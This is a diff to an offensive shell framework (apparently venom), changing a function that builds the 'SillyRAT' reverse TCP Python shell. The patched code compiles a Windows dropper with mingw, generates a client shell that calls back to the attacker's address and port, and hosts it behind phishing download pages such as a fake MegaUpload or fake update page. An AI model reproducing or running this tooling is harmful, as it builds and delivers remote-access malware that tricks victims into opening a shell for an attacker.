@@ -13137,7 +13137,7 @@ sh_menu
 
 # ------------------------------------------
 # SillyRAT (reverse TCP python shell)
-# https://....
+# https://github.com/r00t-3xp10it/venom/tree/master/bin/SillyRAT
 # ------------------------------------------
 sh_evasion6 () {
 Colors;
@@ -13157,17 +13157,34 @@ sleep 2
 
 
 ## Make Sure all dependencies are meet
-# Check if python3 its installed on attacker machine
+# check if mingw32 OR mingw-W64 GCC library exists
 echo "${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white}";sleep 2
+audit=$(which $ComP) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedF}[ERROR] GCC compiler lib not found ($ComP)${white}"
+   if [ "$ArCh" = "x64" ]; then
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
+      echo "" && sudo apt-get update && apt-get install -y mingw-w64 && echo ""
+      ComP="i686-w64-mingw32-gcc" # GCC library used to compile binary
+      GCClib="mingw-W64"
+   else
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
+      echo "" && sudo apt-get update && apt-get install -y mingw32 && echo ""
+      ComP="i586-mingw32msvc-gcc" # GCC library used to compile binary
+      GCClib="mingw32"
+   fi
+fi
+
+## Check if python3 its installed on attacker machine
 audit=$(python3 --version > /dev/null 2>&1) > /dev/null 2>&1
 if [ "$?" -ne "0" ]; then
-   echo "${RedF}[ERROR] python3 interpreter not found${white}"
+   echo "${RedF}[ERROR] python3 interpreter not found${white}";sleep 2
    echo "${BlueF}[${YellowF}i${BlueF}]${white} python3 its required in Attacker/Target to exec Server/Client.${white}";
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3 package.";sleep 2
    echo "" && sudo apt-get update && apt-get install -y python3 && echo ""
 fi
 
-## Check if venomconf file exists
+## Check if 'venomconf' file exists
 if ! [ -e "$IPATH/bin/SillyRAT/venomconf" ]; then
    cd $IPATH/bin/SillyRAT
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing SillyRAT requirements.";sleep 2
@@ -13233,19 +13250,20 @@ if [ "$SOSP" = "Windows" ]; then
    sed -i "s|TempDir|$rpath|g" dropper.c
 
    ## COMPILING C Program USING mingw32 OR mingw-W64
-   echo "${BlueF}[☠]${white} Compiling dropper using mingw32."${Reset};sleep 2
+   echo "${BlueF}[☠]${white} Compiling dropper using $GCClib."${Reset};sleep 2
    # special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
    $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
    rm $IPATH/output/dropper.c > /dev/nul 2>&1
 fi
 
+
 ## Writting Client reverse tcp python shell to output
 echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
 cd $IPATH/bin/SillyRAT
-xterm -T " SillyRAT - $lhost:$lport" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2"
+xterm -T "SillyRAT - Generator Mode" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2"
+
+
 cd $IPATH
-
-
 ## Building 'the Download Webpage' in HTML
 echo "${BlueF}[☠]${white} Building HTML Download WebPage (apache2)"${Reset};sleep 2
 cd $IPATH/templates/phishing
@@ -13259,12 +13277,12 @@ if [ "$SOSP" = "Windows" ]; then
    cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
    mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
 else
-   zip $Drop.zip $Drop.py > /dev/nul 2>&1 # # rev tcp Client shell
+   zip $Drop.zip $Drop.py > /dev/nul 2>&1 # ZIP rev tcp Client shell
    mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # rev tcp Client shell ziped
 fi
+
+
 cd $IPATH
-
-
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---"
@@ -13293,7 +13311,7 @@ rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm $IPATH/output/server.py > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
-
+cd $IPATH
 
 sh_menu
 }
